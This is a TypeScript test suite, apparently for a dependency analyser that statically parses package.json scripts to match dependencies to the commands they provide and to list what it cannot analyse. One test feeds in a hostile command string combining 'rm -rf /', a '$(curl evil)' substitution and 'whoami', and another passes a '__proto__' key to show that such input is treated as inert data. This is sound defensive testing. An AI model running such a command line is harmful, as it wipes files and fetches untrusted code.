import assert from "node:assert/strict";
import { describe, it } from "node:test";
import type { AdapterContext, Dependency, ProjectRef } from "@ghostdeps/core";
import { memoryHandle } from "../testing/fs-handle.js";
import { analyseScript, commandWords, findScriptUsages, scriptGaps } from "./scripts.js";

const project = (path = "."): ProjectRef => ({
  path,
  ecosystem: "javascript-typescript",
  packageManagers: [],
});
const dep = (name: string, path = "."): Dependency => ({
  name,
  constraint: "*",
  kind: "dev",
  project: project(path),
  declaredIn: path === "." ? "package.json" : `${path}/package.json`,
});
const ctx = (files: Record<string, string>): AdapterContext => ({
  repository: memoryHandle(files),
  network: { mode: "offline" },
});

describe("commandWords", () => {
  it("finds command-position words across operators, env vars and wrappers", () => {
    assert.deepEqual(commandWords("tsc -p . && vitest run"), ["tsc", "vitest"]);
    assert.deepEqual(commandWords("NODE_ENV=test cross-env FOO=1 jest --ci"), [
      "cross-env",
      "jest",
    ]);
    assert.deepEqual(commandWords("npx eslint . ; pnpm exec prettier -c ."), [
      "eslint",
      "prettier",
    ]);
    assert.deepEqual(commandWords("yarn tsc && pnpm vitest"), ["tsc", "vitest"]);
    assert.deepEqual(commandWords("./node_modules/.bin/rollup -c | tee log"), ["rollup", "tee"]);
  });

  it("does not treat package-manager builtins or npm run targets as bins", () => {
    assert.deepEqual(commandWords("npm run build && yarn install && pnpm run lint"), []);
  });

  it("never executes anything: hostile text is just words", () => {
    assert.equal(commandWords("x".repeat(100_000)).length, 1);
    const hostile = analyseScript("rm -rf / && $(curl evil) `whoami`");
    assert.deepEqual(hostile.words, ["rm", "curl", "whoami"]);
    assert.ok(hostile.gaps.includes("command substitution"));
  });

  it("follows --, sh -c and wrapper flags that take a value", () => {
    assert.deepEqual(commandWords("dotenv -e .env -- tsc -b"), ["dotenv", "tsc"]);
    assert.deepEqual(commandWords('sh -c "tsc && vitest run"'), ["tsc", "vitest"]);
    assert.deepEqual(commandWords("bash -c 'eslint .'"), ["eslint"]);
    assert.deepEqual(commandWords('nodemon -w src --exec "ts-node src/index.ts"'), [
      "nodemon",
      "ts-node",
    ]);
    assert.deepEqual(commandWords("npx -p typescript tsc"), ["tsc"]);
    assert.deepEqual(commandWords("pnpm --filter web exec vite build"), ["vite"]);
    assert.deepEqual(commandWords("env -u CI jest"), ["jest"]);
  });

  it("reports what it could not analyse", () => {
    assert.deepEqual(analyseScript("tsc -b && vitest run").gaps, []);
    assert.deepEqual(analyseScript("cross-env --weird tsc").gaps, [
      "cross-env: unrecognised flag --weird",
    ]);
    assert.deepEqual(analyseScript("sh ./scripts/build.sh").gaps, [
      "sh runs ./scripts/build.sh, which is not read",
    ]);
    assert.deepEqual(analyseScript("node -e \"require('x')\"").gaps, [
      "node evaluates inline code",
    ]);
    assert.deepEqual(analyseScript("eval $CMD").gaps, ["eval"]);
    assert.deepEqual(analyseScript("echo 'open").gaps, ["unbalanced quote"]);
    assert.deepEqual(analyseScript("x".repeat(9_000)).gaps, ["script too long"]);
    // The file's imports are scanned, but commands it spawns are not.
    assert.deepEqual(analyseScript("node scripts/gen.js").gaps, [
      "node runs scripts/gen.js; commands it spawns are not read",
    ]);
    assert.deepEqual(analyseScript("node --version").gaps, []);
  });
});

describe("scriptGaps", () => {
  it("is empty for plain scripts and names each gap otherwise", async () => {
    const clean = ctx({ "package.json": JSON.stringify({ scripts: { b: "tsc", t: "vitest" } }) });
    assert.deepEqual(await scriptGaps(clean, dep("typescript")), []);
    const gappy = ctx({
      "package.json": JSON.stringify({ scripts: { b: "tsc", ci: "sh ci.sh" } }),
    });
    assert.deepEqual(await scriptGaps(gappy, dep("typescript")), [
      'package.json script "ci": sh runs ci.sh, which is not read',
    ]);
  });

  it("workspace members inherit root scripts: usages and gaps", async () => {
    const context = ctx({
      "package.json": JSON.stringify({ scripts: { lint: "eslint .", gen: "sh gen.sh" } }),
      "packages/a/package.json": JSON.stringify({ scripts: { t: "vitest" } }),
    });
    assert.deepEqual(
      (await findScriptUsages(context, dep("eslint", "packages/a"))).map((u) => u.file),
      ["package.json"],
    );
    assert.deepEqual(await scriptGaps(context, dep("vitest", "packages/a")), [
      'package.json script "gen": sh runs gen.sh, which is not read',
    ]);
    // The root does not inherit from members.
    assert.deepEqual(await findScriptUsages(context, dep("vitest")), []);
  });

  it("an unreadable or malformed manifest is a gap", async () => {
    assert.deepEqual(await scriptGaps(ctx({ "package.json": "{" }), dep("x")), [
      "package.json: malformed",
    ]);
    assert.deepEqual(await scriptGaps(ctx({ "package.json": "{}" }), dep("x")), []);
  });
});

describe("findScriptUsages", () => {
  const manifest = JSON.stringify(
    {
      name: "app",
      scripts: { build: "tsc -p tsconfig.json", test: "vitest run", lint: "eslint ." },
      devDependencies: { typescript: "5", vitest: "2", eslint: "9", react: "18" },
    },
    null,
    2,
  );

  it("script-only dependencies get via=script usage with the script's line", async () => {
    const context = ctx({ "package.json": manifest });
    const ts = await findScriptUsages(context, dep("typescript"));
    assert.deepEqual(
      ts.map((u) => [u.file, u.line, u.via, u.symbols]),
      [["package.json", 4, "script", ["tsc"]]],
    );
    assert.equal((await findScriptUsages(context, dep("vitest"))).length, 1);
    assert.deepEqual(await findScriptUsages(context, dep("react")), []);
  });

  it("uses bin names from the npm lockfile when recorded", async () => {
    const context = ctx({
      "package.json": JSON.stringify({ scripts: { fmt: "fmtx --write ." } }),
      "package-lock.json": JSON.stringify({
        lockfileVersion: 3,
        packages: {
          "": {},
          "node_modules/fancy-formatter": { version: "1.0.0", bin: { fmtx: "bin/fmtx.js" } },
          "node_modules/no-bin": { version: "1.0.0" },
        },
      }),
    });
    assert.deepEqual(
      (await findScriptUsages(context, dep("fancy-formatter"))).map((u) => u.symbols),
      [["fmtx"]],
    );
    // The lockfile says no-bin has no bin, so its name alone is not a match.
    assert.deepEqual(await findScriptUsages(context, dep("no-bin")), []);
  });

  it("reads the dependency's own workspace manifest", async () => {
    const context = ctx({
      "package.json": JSON.stringify({ scripts: { root: "turbo run build" } }),
      "packages/a/package.json": JSON.stringify({ scripts: { t: "vitest" } }),
    });
    assert.equal((await findScriptUsages(context, dep("vitest", "packages/a"))).length, 1);
    assert.deepEqual(await findScriptUsages(context, dep("vitest")), []);
    assert.equal((await findScriptUsages(context, dep("turbo"))).length, 1);
  });

  it("malformed or hostile manifests produce no usages and never throw", async () => {
    for (const text of ["{", "[]", `{"scripts": 5}`, `{"scripts": {"a": 5, "b": null}}`]) {
      assert.deepEqual(
        await findScriptUsages(ctx({ "package.json": text }), dep("typescript")),
        [],
        text,
      );
    }
    // A script literally named "__proto__" is data, not a prototype write.
    await findScriptUsages(
      ctx({ "package.json": `{"scripts": {"__proto__": {"x": 1}}}` }),
      dep("x"),
    );
    assert.equal(({} as Record<string, unknown>).x, undefined);
  });
});
